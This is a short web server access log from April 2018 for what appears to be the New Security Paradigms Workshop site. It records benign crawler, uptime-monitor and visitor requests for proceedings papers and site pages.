66.249.73.91 - - [26/Apr/2018:08:45:49 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 200 2313784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:46:41 -0400] "GET /2009/proceedings/1997/nspw1997-hinton.pdf HTTP/1.1" 200 1247726 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:47:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [26/Apr/2018:08:47:32 -0400] "GET /proceedings/2008 HTTP/1.1" 200 6907 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:49:16 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.7.55 - - [26/Apr/2018:08:49:28 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.7.59 - - [26/Apr/2018:08:49:28 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
35.173.200.32 - - [26/Apr/2018:08:49:56 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 200 229507 "-" "python-requests/2.18.4"
66.249.73.87 - - [26/Apr/2018:08:50:08 -0400] "GET /2018/dates HTTP/1.1" 200 6271 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.236.35.253 - - [26/Apr/2018:08:50:53 -0400] "GET /themes/garland/fix-ie.css HTTP/1.1" 200 4488 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; vivo X5S L Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24"
197.156.77.160 - - [26/Apr/2018:08:50:54 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 200 221324 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
66.249.73.87 - - [26/Apr/2018:08:51:00 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
197.156.77.160 - - [26/Apr/2018:08:51:14 -0400] "-" 408 3408 "-" "-"
66.249.73.87 - - [26/Apr/2018:08:51:51 -0400] "GET /2005/past.shtml HTTP/1.1" 200 5582 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:52:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
